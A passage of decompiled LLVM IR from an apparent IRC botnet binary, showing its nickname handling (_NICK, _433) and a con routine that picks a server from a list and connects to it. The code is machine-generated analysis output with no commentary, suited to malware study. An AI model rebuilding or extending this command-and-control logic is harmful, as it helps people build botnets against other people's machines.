  %v4_8055703 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_8055706

dec_label_pc_8055706:                             ; preds = %dec_label_pc_8055706.preheader, %dec_label_pc_8055700
  %stack_var_-28.0 = phi i32 [ %v4_8055703, %dec_label_pc_8055700 ], [ %stack_var_-28.165, %dec_label_pc_8055706.preheader ]
  %stack_var_-20.0 = phi i8* [ %v22_8055700, %dec_label_pc_8055700 ], [ %stack_var_-20.166, %dec_label_pc_8055706.preheader ]
  %v3_805571a = call i32 @_strlen(i8* %arg2)
  %v7_8055721 = icmp ult i32 %stack_var_-28.0, %v3_805571a
  %v1_8055723 = icmp eq i1 %v7_8055721, false
  %.pre32 = ptrtoint i8* %stack_var_-20.0 to i32
  br i1 %v1_8055723, label %dec_label_pc_805572e, label %dec_label_pc_8055725

dec_label_pc_8055725:                             ; preds = %dec_label_pc_8055706
  %v2_8055728 = load i8, i8* %stack_var_-20.0, align 1
  %v7_805572a = icmp eq i8 %v2_8055728, 32
  %v1_805572c = icmp eq i1 %v7_805572a, false
  br i1 %v1_805572c, label %dec_label_pc_8055700, label %dec_label_pc_805572e

dec_label_pc_805572e:                             ; preds = %dec_label_pc_8055706, %dec_label_pc_8055725
  %v5_805572e = add i32 %.pre32, 1
  %v3_8055745 = call i32 @_strlen(i8* %arg2)
  %v4_8055745 = mul i32 %v3_8055745, -1
  %v1_805574b = sub i32 0, %v4_8055745
  %v2_805574c = sub i32 0, %v4_8055745
  %v12_805574c = icmp eq i32 %stack_var_-28.0, %v2_805574c
  br i1 %v12_805574c, label %dec_label_pc_8055921, label %dec_label_pc_8055754

dec_label_pc_8055754:                             ; preds = %dec_label_pc_805572e
  %v22_805572e = inttoptr i32 %v5_805572e to i8*
  %v4_8055754 = add nuw nsw i32 %storemerge767, 1
  %v7_805575b = icmp sgt i32 %storemerge767, 3
  br i1 %v7_805575b, label %dec_label_pc_8055769.preheader, label %dec_label_pc_8055706.preheader

dec_label_pc_8055706.preheader:                   ; preds = %entry, %dec_label_pc_8055754
  %storemerge767 = phi i32 [ 0, %entry ], [ %v4_8055754, %dec_label_pc_8055754 ]
  %stack_var_-20.166 = phi i8* [ %arg2, %entry ], [ %v22_805572e, %dec_label_pc_8055754 ]
  %stack_var_-28.165 = phi i32 [ 0, %entry ], [ %stack_var_-28.0, %dec_label_pc_8055754 ]
  br label %dec_label_pc_8055706

dec_label_pc_8055769.preheader:                   ; preds = %dec_label_pc_8055754
  br label %dec_label_pc_8055769

dec_label_pc_8055766:                             ; preds = %dec_label_pc_8055788
  %v4_8055766 = add i32 %storemerge6, 1
  br label %dec_label_pc_8055769

dec_label_pc_8055769:                             ; preds = %dec_label_pc_8055769.preheader, %dec_label_pc_8055766
  %storemerge6 = phi i32 [ %v4_8055766, %dec_label_pc_8055766 ], [ 0, %dec_label_pc_8055769.preheader ]
  %v3_805577d = call i32 @_strlen(i8* %v22_805572e)
  %v7_8055784 = icmp ult i32 %storemerge6, %v3_805577d
  %v1_8055786 = icmp eq i1 %v7_8055784, false
  %.pre = add i32 %storemerge6, %v5_805572e
  br i1 %v1_8055786, label %dec_label_pc_8055769.dec_label_pc_8055794_crit_edge, label %dec_label_pc_8055788

dec_label_pc_8055769.dec_label_pc_8055794_crit_edge: ; preds = %dec_label_pc_8055769
  %.pre21 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_8055794

dec_label_pc_8055788:                             ; preds = %dec_label_pc_8055769
  %v1_805578e = inttoptr i32 %.pre to i8*
  %v2_805578e = load i8, i8* %v1_805578e, align 1
  %v7_8055790 = icmp eq i8 %v2_805578e, 32
  %v1_8055792 = icmp eq i1 %v7_8055790, false
  br i1 %v1_8055792, label %dec_label_pc_8055766, label %dec_label_pc_8055794

dec_label_pc_8055794:                             ; preds = %dec_label_pc_8055788, %dec_label_pc_8055769.dec_label_pc_8055794_crit_edge
  %v1_805579a.pre-phi = phi i8* [ %.pre21, %dec_label_pc_8055769.dec_label_pc_8055794_crit_edge ], [ %v1_805578e, %dec_label_pc_8055788 ]
  store i8 0, i8* %v1_805579a.pre-phi, align 1
  %v0_805579d = load i32, i32* @global_var_807d3cc.53, align 4
  %v3_80557a9 = call i32 @__GI_strcasecmp(i8* %v22_805572e, i32 %v0_805579d)
  %v1_80557b1 = icmp eq i32 %v3_80557a9, 0
  %v1_80557b3 = icmp eq i1 %v1_80557b1, false
  br i1 %v1_80557b3, label %dec_label_pc_8055921, label %dec_label_pc_80557b9

dec_label_pc_80557b9:                             ; preds = %dec_label_pc_8055794
  %v0_80557b9 = load i64, i64* @global_var_80748f0.34, align 8
  %v1_80557b9 = trunc i64 %v0_80557b9 to i32
  %v1_80557be = icmp eq i32 %v1_80557b9, 0
  %v1_80557c0 = icmp eq i1 %v1_80557be, false
  br i1 %v1_80557c0, label %dec_label_pc_8055921, label %dec_label_pc_80557c6

dec_label_pc_80557c6:                             ; preds = %dec_label_pc_80557b9
  br label %dec_label_pc_80557e2.preheader

dec_label_pc_80557dc:                             ; preds = %dec_label_pc_8055801
  %v5_80557dc = add i32 %.pre31, 1
  %v22_80557dc = inttoptr i32 %v5_80557dc to i8*
  %v4_80557df = add i32 %stack_var_-28.2, 1
  br label %dec_label_pc_80557e2

dec_label_pc_80557e2:                             ; preds = %dec_label_pc_80557e2.preheader, %dec_label_pc_80557dc
  %stack_var_-28.2 = phi i32 [ %v4_80557df, %dec_label_pc_80557dc ], [ %stack_var_-28.362, %dec_label_pc_80557e2.preheader ]
  %stack_var_-20.2 = phi i8* [ %v22_80557dc, %dec_label_pc_80557dc ], [ %stack_var_-20.363, %dec_label_pc_80557e2.preheader ]
  %v3_80557f6 = call i32 @_strlen(i8* %arg2)
  %v7_80557fd = icmp ult i32 %stack_var_-28.2, %v3_80557f6
  %v1_80557ff = icmp eq i1 %v7_80557fd, false
  %.pre31 = ptrtoint i8* %stack_var_-20.2 to i32
  br i1 %v1_80557ff, label %dec_label_pc_805580a, label %dec_label_pc_8055801

dec_label_pc_8055801:                             ; preds = %dec_label_pc_80557e2
  %v2_8055804 = load i8, i8* %stack_var_-20.2, align 1
  %v7_8055806 = icmp eq i8 %v2_8055804, 32
  %v1_8055808 = icmp eq i1 %v7_8055806, false
  br i1 %v1_8055808, label %dec_label_pc_80557dc, label %dec_label_pc_805580a

dec_label_pc_805580a:                             ; preds = %dec_label_pc_80557e2, %dec_label_pc_8055801
  %v5_805580a = add i32 %.pre31, 1
  %v3_8055821 = call i32 @_strlen(i8* %arg2)
  %v4_8055821 = mul i32 %v3_8055821, -1
  %v1_8055827 = sub i32 0, %v4_8055821
  %v2_8055828 = sub i32 0, %v4_8055821
  %v12_8055828 = icmp eq i32 %stack_var_-28.2, %v2_8055828
  br i1 %v12_8055828, label %dec_label_pc_8055921, label %dec_label_pc_8055830

dec_label_pc_8055830:                             ; preds = %dec_label_pc_805580a
  %v22_805580a = inttoptr i32 %v5_805580a to i8*
  %v4_8055830 = add nuw nsw i32 %storemerge564, 1
  %v7_8055837 = icmp sgt i32 %storemerge564, 1
  br i1 %v7_8055837, label %dec_label_pc_8055845.preheader, label %dec_label_pc_80557e2.preheader

dec_label_pc_80557e2.preheader:                   ; preds = %dec_label_pc_80557c6, %dec_label_pc_8055830
  %storemerge564 = phi i32 [ 0, %dec_label_pc_80557c6 ], [ %v4_8055830, %dec_label_pc_8055830 ]
  %stack_var_-20.363 = phi i8* [ %arg2, %dec_label_pc_80557c6 ], [ %v22_805580a, %dec_label_pc_8055830 ]
  %stack_var_-28.362 = phi i32 [ 0, %dec_label_pc_80557c6 ], [ %stack_var_-28.2, %dec_label_pc_8055830 ]
  br label %dec_label_pc_80557e2

dec_label_pc_8055845.preheader:                   ; preds = %dec_label_pc_8055830
  br label %dec_label_pc_8055845

dec_label_pc_8055842:                             ; preds = %dec_label_pc_8055864
  %v4_8055842 = add i32 %storemerge, 1
  br label %dec_label_pc_8055845

dec_label_pc_8055845:                             ; preds = %dec_label_pc_8055845.preheader, %dec_label_pc_8055842
  %storemerge = phi i32 [ %v4_8055842, %dec_label_pc_8055842 ], [ 0, %dec_label_pc_8055845.preheader ]
  store i32 %storemerge, i32* @edx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v5_805580a, i32* @edi, align 4
  %v3_8055859 = call i32 @_strlen(i8* %v22_805580a)
  %v0_8055860 = load i32, i32* @edx, align 4
  %v7_8055860 = icmp ult i32 %v0_8055860, %v3_8055859
  %v1_8055862 = icmp eq i1 %v7_8055860, false
  %.pre22 = add i32 %storemerge, %v5_805580a
  br i1 %v1_8055862, label %dec_label_pc_8055845.dec_label_pc_8055870_crit_edge, label %dec_label_pc_8055864

dec_label_pc_8055845.dec_label_pc_8055870_crit_edge: ; preds = %dec_label_pc_8055845
  %.pre29 = inttoptr i32 %.pre22 to i8*
  br label %dec_label_pc_8055870

dec_label_pc_8055864:                             ; preds = %dec_label_pc_8055845
  %v1_805586a = inttoptr i32 %.pre22 to i8*
  %v2_805586a = load i8, i8* %v1_805586a, align 1
  %v7_805586c = icmp eq i8 %v2_805586a, 32
  %v1_805586e = icmp eq i1 %v7_805586c, false
  br i1 %v1_805586e, label %dec_label_pc_8055842, label %dec_label_pc_8055870

dec_label_pc_8055870:                             ; preds = %dec_label_pc_8055864, %dec_label_pc_8055845.dec_label_pc_8055870_crit_edge
  %v1_8055876.pre-phi = phi i8* [ %.pre29, %dec_label_pc_8055845.dec_label_pc_8055870_crit_edge ], [ %v1_805586a, %dec_label_pc_8055864 ]
  store i8 0, i8* %v1_8055876.pre-phi, align 1
  %v1_805587f = call i32 @inet_addr(i32 %v5_805580a)
  %v2_805587f = trunc i32 %v1_805587f to i8
  store i8 %v2_805587f, i8* %stack_var_-32, align 1
  %sext = mul i32 %v1_805587f, 16777216
  %tmp = icmp eq i32 %sext, -16777216
  %v1_8055890 = icmp eq i1 %tmp, false
  br i1 %v1_8055890, label %dec_label_pc_8055870._crit_edge, label %dec_label_pc_8055892

dec_label_pc_8055870._crit_edge:                  ; preds = %dec_label_pc_8055870
  br label %bb

dec_label_pc_8055892:                             ; preds = %dec_label_pc_8055870
  %v1_8055898 = call i32 @__GI_gethostbyname(i32 %v5_805580a)
  %v4_80558a3 = icmp eq i32 %v1_8055898, 0
  %v1_80558a7 = icmp eq i1 %v4_80558a3, false
  br i1 %v1_80558a7, label %dec_label_pc_80558c4, label %dec_label_pc_80558a9

dec_label_pc_80558a9:                             ; preds = %dec_label_pc_8055892
  %v2_80558ba = call i32 @Send(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_806c6c8.595 to i32))
  br label %dec_label_pc_8055921

dec_label_pc_80558c4:                             ; preds = %dec_label_pc_8055892
  %v1_80558c7 = add i32 %v1_8055898, 12
  %v2_80558c7 = inttoptr i32 %v1_80558c7 to i32*
  %v3_80558c7 = load i32, i32* %v2_80558c7, align 4
  %v1_80558cf = add i32 %v1_8055898, 16
  %v2_80558cf = inttoptr i32 %v1_80558cf to i32*
  %v3_80558cf = load i32, i32* %v2_80558cf, align 4
  %v1_80558d2 = inttoptr i32 %v3_80558cf to i32*
  %v2_80558d2 = load i32, i32* %v1_80558d2, align 4
  %v1_80558d9 = inttoptr i32 %v2_80558d2 to i8*
  %v7_80558dc = call i8* @_memcpy(i8* nonnull %stack_var_-32, i8* %v1_80558d9, i32 %v3_80558c7)
  %v2_80558e9.pre = load i8, i8* %stack_var_-32, align 1
  br label %bb

bb:                                               ; preds = %dec_label_pc_8055870._crit_edge, %dec_label_pc_80558c4
  %v2_80558e9 = phi i8 [ %v2_805587f, %dec_label_pc_8055870._crit_edge ], [ %v2_80558e9.pre, %dec_label_pc_80558c4 ]
  store i8 %v2_80558e9, i8* bitcast (i8** @global_var_80748ef.596 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_80748ec.33 to i8*), align 4
  store i64 256, i64* @global_var_80748f0.34, align 16
  br label %dec_label_pc_8055921

dec_label_pc_8055921:                             ; preds = %dec_label_pc_805572e, %dec_label_pc_805580a, %dec_label_pc_80557b9, %dec_label_pc_8055794, %dec_label_pc_80558a9, %bb
  %v0_8055927 = phi i32 [ %v1_80557b9, %dec_label_pc_80557b9 ], [ %v3_80557a9, %dec_label_pc_8055794 ], [ %v2_80558ba, %dec_label_pc_80558a9 ], [ ptrtoint (i8** @global_var_80748ec.33 to i32), %bb ], [ %v1_8055827, %dec_label_pc_805580a ], [ %v1_805574b, %dec_label_pc_805572e ]
  ret i32 %v0_8055927

; uselistorder directives
  uselistorder i32 %.pre22, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %storemerge564, { 1, 0 }
  uselistorder i32 %v5_805580a, { 1, 2, 0, 3, 4 }
  uselistorder i8* %stack_var_-20.2, { 1, 0 }
  uselistorder i32 %stack_var_-28.2, { 2, 0, 1, 3 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge6, { 1, 0, 2 }
  uselistorder i32 %storemerge767, { 1, 0 }
  uselistorder i8* %stack_var_-20.0, { 1, 0 }
  uselistorder i32 %stack_var_-28.0, { 2, 0, 1, 3 }
  uselistorder i8** @global_var_80748ec.33, { 6, 0, 5, 4, 3, 2, 1 }
  uselistorder i64* @global_var_80748f0.34, { 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i8* %arg2, { 1, 2, 3, 0, 4, 5 }
  uselistorder label %dec_label_pc_8055921, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_8055845, { 1, 0 }
  uselistorder label %dec_label_pc_80557e2.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_805580a, { 1, 0 }
  uselistorder label %dec_label_pc_8055769, { 1, 0 }
  uselistorder label %dec_label_pc_8055706.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_805572e, { 1, 0 }
}

define i32 @_433() local_unnamed_addr {
entry:
  %v0_805592e = load i32, i32* @global_var_807d3cc.53, align 4
  %v1_8055937 = call i32 @free(i32 %v0_805592e)
  %v2_8055946 = call i32 @realrand(i32 4, i32 8)
  %v1_8055952 = inttoptr i32 %v2_8055946 to i8*
  %v2_8055952 = call i32 @randstring(i8* %v1_8055952)
  store i32 %v2_8055952, i32* @global_var_807d3cc.53, align 4
  ret i32 %v2_8055952

; uselistorder directives
  uselistorder i32 %v2_8055952, { 1, 0 }
}

define i32 @_NICK(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp19 = inttoptr i32 %arg2 to i8*
  %v4_8055977 = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_8055974

dec_label_pc_8055971:                             ; preds = %dec_label_pc_8055993
  %v4_8055971 = add i32 %storemerge, 1
  br label %dec_label_pc_8055974

dec_label_pc_8055974:                             ; preds = %entry, %dec_label_pc_8055971
  %storemerge = phi i32 [ %v4_8055971, %dec_label_pc_8055971 ], [ 0, %entry ]
  store i1 false, i1* @df, align 1
  store i32 %v4_8055977, i32* @edi, align 4
  %v3_8055988 = call i32 @_strlen(i8* %arg1)
  %v7_805598f = icmp ult i32 %storemerge, %v3_8055988
  %v1_8055991 = icmp eq i1 %v7_805598f, false
  %.pre = add i32 %storemerge, %v4_8055977
  br i1 %v1_8055991, label %dec_label_pc_8055974.dec_label_pc_805599f_crit_edge, label %dec_label_pc_8055993

dec_label_pc_8055974.dec_label_pc_805599f_crit_edge: ; preds = %dec_label_pc_8055974
  %.pre12 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_805599f

dec_label_pc_8055993:                             ; preds = %dec_label_pc_8055974
  %v1_8055999 = inttoptr i32 %.pre to i8*
  %v2_8055999 = load i8, i8* %v1_8055999, align 1
  %v10_805599b = icmp eq i8 %v2_8055999, 33
  %v1_805599d = icmp eq i1 %v10_805599b, false
  br i1 %v1_805599d, label %dec_label_pc_8055971, label %dec_label_pc_805599f

dec_label_pc_805599f:                             ; preds = %dec_label_pc_8055993, %dec_label_pc_8055974.dec_label_pc_805599f_crit_edge
  %v1_80559a5.pre-phi = phi i8* [ %.pre12, %dec_label_pc_8055974.dec_label_pc_805599f_crit_edge ], [ %v1_8055999, %dec_label_pc_8055993 ]
  store i8 0, i8* %v1_80559a5.pre-phi, align 1
  %v0_80559a8 = load i32, i32* @global_var_807d3cc.53, align 4
  %v3_80559b4 = call i32 @__GI_strcasecmp(i8* %arg1, i32 %v0_80559a8)
  %v1_80559bc = icmp eq i32 %v3_80559b4, 0
  %v1_80559be = icmp eq i1 %v1_80559bc, false
  br i1 %v1_80559be, label %dec_label_pc_8055a06, label %dec_label_pc_80559c0

dec_label_pc_80559c0:                             ; preds = %dec_label_pc_805599f
  %v2_80559c3 = load i8, i8* %tmp19, align 1
  %v10_80559c5 = icmp eq i8 %v2_80559c3, 58
  %v1_80559c7 = icmp eq i1 %v10_80559c5, false
  br i1 %v1_80559c7, label %dec_label_pc_80559cc, label %dec_label_pc_80559c9

dec_label_pc_80559c9:                             ; preds = %dec_label_pc_80559c0
  br label %dec_label_pc_80559cc

dec_label_pc_80559cc:                             ; preds = %dec_label_pc_80559c0, %dec_label_pc_80559c9
  %v0_80559cc = load i32, i32* @global_var_807d3cc.53, align 4
  %v1_80559d1 = icmp eq i32 %v0_80559cc, 0
  br i1 %v1_80559d1, label %dec_label_pc_80559cc.dec_label_pc_80559e6_crit_edge, label %dec_label_pc_80559d5

dec_label_pc_80559cc.dec_label_pc_80559e6_crit_edge: ; preds = %dec_label_pc_80559cc
  br label %dec_label_pc_80559e6

dec_label_pc_80559d5:                             ; preds = %dec_label_pc_80559cc
  %v1_80559de = call i32 @free(i32 %v0_80559cc)
  br label %dec_label_pc_80559e6

dec_label_pc_80559e6:                             ; preds = %dec_label_pc_80559cc.dec_label_pc_80559e6_crit_edge, %dec_label_pc_80559d5
  %v2_80559ed = call i32 @realrand(i32 4, i32 8)
  %v1_80559f9 = inttoptr i32 %v2_80559ed to i8*
  %v2_80559f9 = call i32 @randstring(i8* %v1_80559f9)
  store i32 %v2_80559f9, i32* @global_var_807d3cc.53, align 4
  br label %dec_label_pc_8055a06

dec_label_pc_8055a06:                             ; preds = %dec_label_pc_805599f, %dec_label_pc_80559e6
  %v0_8055a0a = phi i32 [ %v3_80559b4, %dec_label_pc_805599f ], [ %v2_80559f9, %dec_label_pc_80559e6 ]
  ret i32 %v0_8055a0a

; uselistorder directives
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i8* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8055a06, { 1, 0 }
  uselistorder label %dec_label_pc_80559e6, { 1, 0 }
  uselistorder label %dec_label_pc_80559cc, { 1, 0 }
  uselistorder label %dec_label_pc_8055974, { 1, 0 }
}

define i32 @con() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp21 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055a0b = load i32, i32* @ebp, align 4
  store i32 %v0_8055a0b, i32* %stack_var_-4, align 4
  %v4_8055a0b = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8055a0b, i32* @ebp, align 4
  %v15_8055a0e = ptrtoint i32* %stack_var_-60 to i32
  store i32 0, i32* %stack_var_-24, align 4
  %v0_8055a1f = load i32, i32* @global_var_807d3d0.29, align 16
  store i32 %v0_8055a1f, i32* %edx.global-to-local, align 4
  %v2_8055a2c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8055a2c, i32* %eax.global-to-local, align 4
  %v5_8055a35 = call i32 @getsockopt(i32 %v0_8055a1f)
  store i32 %v5_8055a35, i32* %eax.global-to-local, align 4
  %v4_8055a40 = icmp eq i32 %v5_8055a35, 0
  %v1_8055a44 = icmp eq i1 %v4_8055a40, false
  br i1 %v1_8055a44, label %dec_label_pc_8055a53.preheader, label %dec_label_pc_8055a46

dec_label_pc_8055a46:                             ; preds = %entry
  %v3_8055a46 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_8055a46, i32* %eax.global-to-local, align 4
  %v1_8055a49 = icmp eq i32 %v3_8055a46, 0
  br i1 %v1_8055a49, label %dec_label_pc_8055c80, label %dec_label_pc_8055a53.preheader

dec_label_pc_8055a53.preheader:                   ; preds = %entry, %dec_label_pc_8055a46
  %v2_8055b26 = ptrtoint i32* %stack_var_-44 to i32
  %v2_8055b29 = ptrtoint i32* %stack_var_-40 to i32
  %v2_8055b7b = ptrtoint i32* %stack_var_-48 to i32
  br label %dec_label_pc_8055a53

dec_label_pc_8055a53:                             ; preds = %dec_label_pc_8055a53.backedge, %dec_label_pc_8055a53.preheader
  %v0_8055a9a.pre15 = phi i32 [ %v15_8055a0e, %dec_label_pc_8055a53.preheader ], [ %storemerge17.in, %dec_label_pc_8055a53.backedge ]
  %stack_var_-8.0 = phi i32 [ %tmp21, %dec_label_pc_8055a53.preheader ], [ %stack_var_-8.0.be, %dec_label_pc_8055a53.backedge ]
  store i32 -1, i32* @global_var_807d3d0.29, align 16
  store i32 1, i32* %stack_var_-48, align 4
  %v0_8055a64 = load i32, i32* @global_var_80748e4.496, align 4
  store i32 %v0_8055a64, i32* %eax.global-to-local, align 4
  %v1_8055a69 = icmp eq i32 %v0_8055a64, 0
  %v1_8055a6b = icmp eq i1 %v1_8055a69, false
  br i1 %v1_8055a6b, label %dec_label_pc_8055a90, label %dec_label_pc_8055a6d

dec_label_pc_8055a6d:                             ; preds = %dec_label_pc_8055a53
  %v1_8055a6d = call i32 @random()
  %v0_8055a74 = load i64, i64* @global_var_806f8a0.599, align 8
  %v2_8055a7d = ashr i32 %v1_8055a6d, 31
  %v2_8055a80 = zext i32 %v1_8055a6d to i64
  %v4_8055a80 = zext i32 %v2_8055a7d to i64
  %v5_8055a80 = mul nuw i64 %v4_8055a80, 4294967296
  %v6_8055a80 = or i64 %v5_8055a80, %v2_8055a80
  %v7_8055a80 = and i64 %v0_8055a74, 4294967295
  %v10_8055a80 = srem i64 %v6_8055a80, %v7_8055a80
  %v11_8055a80 = trunc i64 %v10_8055a80 to i32
  store i32 %v11_8055a80, i32* %edx.global-to-local, align 4
  store i32 %v11_8055a80, i32* %eax.global-to-local, align 4
  %v1_8055a84 = mul i32 %v11_8055a80, 4
  %v2_8055a84 = add i32 %v1_8055a84, ptrtoint ([14 x i8]** @global_var_806f8a4.601 to i32)
  %v3_8055a84 = inttoptr i32 %v2_8055a84 to i32*
  %v4_8055a84 = load i32, i32* %v3_8055a84, align 4
  store i32 %v4_8055a84, i32* %eax.global-to-local, align 4
  store i32 %v4_8055a84, i32* @global_var_807d504.495, align 4
  %v0_8055a9a.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8055a90

dec_label_pc_8055a90:                             ; preds = %dec_label_pc_8055a53, %dec_label_pc_8055a6d
  %v0_8055a9a.pre = phi i32 [ %v0_8055a9a.pre15, %dec_label_pc_8055a53 ], [ %v0_8055a9a.pre.pre, %dec_label_pc_8055a6d ]
  store i32 0, i32* @global_var_80748e4.496, align 4
  br label %dec_label_pc_8055a9a

dec_label_pc_8055a9a:                             ; preds = %dec_label_pc_8055a9a, %dec_label_pc_8055a90
  %v0_8055a9a = phi i32 [ %v1_8055aa8, %dec_label_pc_8055a9a ], [ %v0_8055a9a.pre, %dec_label_pc_8055a90 ]
  %v1_8055a9d = add i32 %v0_8055a9a, -8
  %v2_8055a9d = inttoptr i32 %v1_8055a9d to i32*
  store i32 6, i32* %v2_8055a9d, align 4
  %v1_8055a9f = add i32 %v0_8055a9a, -12
  %v2_8055a9f = inttoptr i32 %v1_8055a9f to i32*
  store i32 1, i32* %v2_8055a9f, align 4
  %v1_8055aa1 = add i32 %v0_8055a9a, -16
  %v2_8055aa1 = inttoptr i32 %v1_8055aa1 to i32*
  store i32 2, i32* %v2_8055aa1, align 4
  %v0_8055aa3 = load i32, i32* %stack_var_-48, align 4
  %v1_8055aa3 = load i32, i32* %stack_var_-44, align 4
  %v2_8055aa3 = load i32, i32* %stack_var_-40, align 4
  %v3_8055aa3 = call i32 @socket(i32 %v0_8055aa3, i32 %v1_8055aa3, i32 %v2_8055aa3)
  %v0_8055aa8 = load i32, i32* @esp, align 4
  %v1_8055aa8 = add i32 %v0_8055aa8, 16
  store i32 %v3_8055aa3, i32* @global_var_807d3d0.29, align 16
  store i32 %v3_8055aa3, i32* %eax.global-to-local, align 4
  %v2_8055ab5 = icmp slt i32 %v3_8055aa3, 0
  br i1 %v2_8055ab5, label %dec_label_pc_8055a9a, label %dec_label_pc_8055ab9

dec_label_pc_8055ab9:                             ; preds = %dec_label_pc_8055a9a
  %v0_8055ab9 = load i32, i32* @global_var_807d504.495, align 4
  store i32 %v0_8055ab9, i32* %eax.global-to-local, align 4
  %v3_8055ac1 = inttoptr i32 %v0_8055aa8 to i32*
  store i32 %v0_8055ab9, i32* %v3_8055ac1, align 4
  %v0_8055ac2 = load i32, i32* %stack_var_-48, align 4
  %v1_8055ac2 = call i32 @inet_addr(i32 %v0_8055ac2)
  store i32 %v1_8055ac2, i32* %eax.global-to-local, align 4
  %v0_8055ac7 = load i32, i32* @esp, align 4
  %v1_8055aca = icmp eq i32 %v1_8055ac2, 0
  br i1 %v1_8055aca, label %dec_label_pc_8055ae4, label %dec_label_pc_8055ace

dec_label_pc_8055ace:                             ; preds = %dec_label_pc_8055ab9
  %v0_8055ace = load i32, i32* @global_var_807d504.495, align 4
  store i32 %v0_8055ace, i32* %eax.global-to-local, align 4
  %v3_8055ad6 = inttoptr i32 %v0_8055ac7 to i32*
  store i32 %v0_8055ace, i32* %v3_8055ad6, align 4
  %v0_8055ad7 = load i32, i32* %stack_var_-48, align 4
  %v1_8055ad7 = call i32 @inet_addr(i32 %v0_8055ad7)
  store i32 %v1_8055ad7, i32* %eax.global-to-local, align 4
  %v0_8055adc = load i32, i32* @esp, align 4
  %v10_8055adf = icmp eq i32 %v1_8055ad7, -1
  %v1_8055ae2 = icmp eq i1 %v10_8055adf, false
  br i1 %v1_8055ae2, label %dec_label_pc_8055b44, label %dec_label_pc_8055ae4

dec_label_pc_8055ae4:                             ; preds = %dec_label_pc_8055ace, %dec_label_pc_8055ab9
  %v0_8055ae9.in = phi i32 [ %v0_8055adc, %dec_label_pc_8055ace ], [ %v0_8055ac7, %dec_label_pc_8055ab9 ]
  %v0_8055ae4 = load i32, i32* @global_var_807d504.495, align 4
  store i32 %v0_8055ae4, i32* %eax.global-to-local, align 4
  %v3_8055aec = inttoptr i32 %v0_8055ae9.in to i32*
  store i32 %v0_8055ae4, i32* %v3_8055aec, align 4
  %v0_8055aed = load i32, i32* %stack_var_-48, align 4
  %v1_8055aed = call i32 @__GI_gethostbyname(i32 %v0_8055aed)
  store i32 %v1_8055aed, i32* %eax.global-to-local, align 4
  %v0_8055af2 = load i32, i32* @esp, align 4
  %v4_8055af8 = icmp eq i32 %v1_8055aed, 0
  %v1_8055afc = icmp eq i1 %v4_8055af8, false
  br i1 %v1_8055afc, label %dec_label_pc_8055b1e, label %dec_label_pc_8055afe

dec_label_pc_8055afe:                             ; preds = %dec_label_pc_8055ae4
  store i32 0, i32* @global_var_807d504.495, align 4
  %v0_8055b08 = load i32, i32* @global_var_807d3d0.29, align 16
  store i32 %v0_8055b08, i32* %eax.global-to-local, align 4
  %v3_8055b10 = inttoptr i32 %v0_8055af2 to i32*
  store i32 %v0_8055b08, i32* %v3_8055b10, align 4
  %v1_8055b11 = call i32 @close(i32 %v1_8055aed)
  br label %dec_label_pc_8055a53.backedge

dec_label_pc_8055a53.backedge:                    ; preds = %dec_label_pc_8055afe, %dec_label_pc_8055c60
  %storemerge = phi i32 [ %v1_8055b11, %dec_label_pc_8055afe ], [ %v1_8055c73, %dec_label_pc_8055c60 ]
  %stack_var_-8.0.be = phi i32 [ %v1_8055aed, %dec_label_pc_8055afe ], [ %stack_var_-8.1, %dec_label_pc_8055c60 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %storemerge17.in.in = load i32, i32* @esp, align 4
  %storemerge17.in = add i32 %storemerge17.in.in, 16
  br label %dec_label_pc_8055a53

dec_label_pc_8055b1e:                             ; preds = %dec_label_pc_8055ae4
  store i32 %v1_8055aed, i32* %eax.global-to-local, align 4
  %v1_8055b21 = add i32 %v1_8055aed, 12
  %v2_8055b21 = inttoptr i32 %v1_8055b21 to i32*
  %v3_8055b21 = load i32, i32* %v2_8055b21, align 4
  store i32 %v3_8055b21, i32* %edx.global-to-local, align 4
  store i32 %v1_8055aed, i32* %eax.global-to-local, align 4
  %v1_8055b2f = add i32 %v1_8055aed, 16
  %v2_8055b2f = inttoptr i32 %v1_8055b2f to i32*
  %v3_8055b2f = load i32, i32* %v2_8055b2f, align 4
  store i32 %v3_8055b2f, i32* %eax.global-to-local, align 4
  %v1_8055b32 = inttoptr i32 %v3_8055b2f to i32*
  %v2_8055b32 = load i32, i32* %v1_8055b32, align 4
  store i32 %v2_8055b32, i32* %eax.global-to-local, align 4
  %v2_8055b37 = add i32 %v0_8055af2, 8
  %v3_8055b37 = inttoptr i32 %v2_8055b37 to i32*
  store i32 %v3_8055b21, i32* %v3_8055b37, align 4
  %v2_8055b38 = add i32 %v0_8055af2, 4
  %v3_8055b38 = inttoptr i32 %v2_8055b38 to i32*
  store i32 %v2_8055b29, i32* %v3_8055b38, align 4
  %v0_8055b39 = load i32, i32* %eax.global-to-local, align 4
  %v3_8055b39 = inttoptr i32 %v0_8055af2 to i32*
